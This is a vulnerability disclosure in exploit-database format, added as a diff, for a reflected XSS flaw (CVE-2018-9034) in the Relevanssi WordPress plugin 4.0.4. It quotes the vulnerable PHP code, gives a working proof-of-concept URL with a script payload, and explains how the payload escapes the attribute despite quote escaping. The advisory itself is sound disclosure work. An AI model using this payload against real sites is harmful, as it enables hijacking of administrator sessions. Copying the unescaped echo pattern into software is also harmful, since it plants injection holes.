@@ -1,0 +1,46 @@
+# Exploit Title : Relevanssi Wordpress Search Plugin Reflected Cross Site Scripting (XSS)
+# Date: 23-03-2018 
+# Exploit Author : Stefan Broeder
+# Contact : https://twitter.com/stefanbroeder
+# Vendor Homepage: https://www.relevanssi.com
+# Software Link: https://wordpress.org/plugins/relevanssi
+# Version: 4.0.4
+# CVE : CVE-2018-9034
+# Category : webapps
+
+Description
+===========
+Relevanssi is a WordPress plugin with more than 100.000 active installations. Version 4.0.4 (and possibly previous versions) are affected by a Reflected XSS vulnerability.
+
+Vulnerable part of code
+=======================
+File: relevanssi/lib/interface.php:1055 displays unescaped value of $_GET variable 'tab'.
+
+..
+1049 if( isset( $_REQUEST[ 'tab' ] ) ) { 
+1050 $active_tab = $_REQUEST[ 'tab' ]; 
+1051 } // end if 
+1052
+1053 if ($active_tab === "stopwords") $display_save_button = false; 
+1054
+1055 echo "<input type='hidden' name='tab' value='$active_tab' />"; 
+..
+
+Impact
+======
+Arbitrary JavaScript code can be run on browser side if a logged in WordPress administrator is tricked to click on a link or browse a URL under the attacker control.
+This can potentially lead to creation of new admin users, or remote code execution on the server.
+
+Proof of Concept
+============
+In order to exploit this vulnerability, the attacker needs to have the victim visit the following link:
+
+/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+
+
+Please note that quotes and double quotes are properly escaped by WordPress, however javascript escaping (\) is applied while the value is in an HTML attribute. There, escaping a quote by \' has no effect (&quot should be used). This allows us to break out of the HTML attribute and start the script tag. Within the script, quotes are properly escaped but there are ways to obfuscate javascript without requiring these symbols as can be seen in above payload.
+
+
+Solution
+========
+
+Update to version 4.1
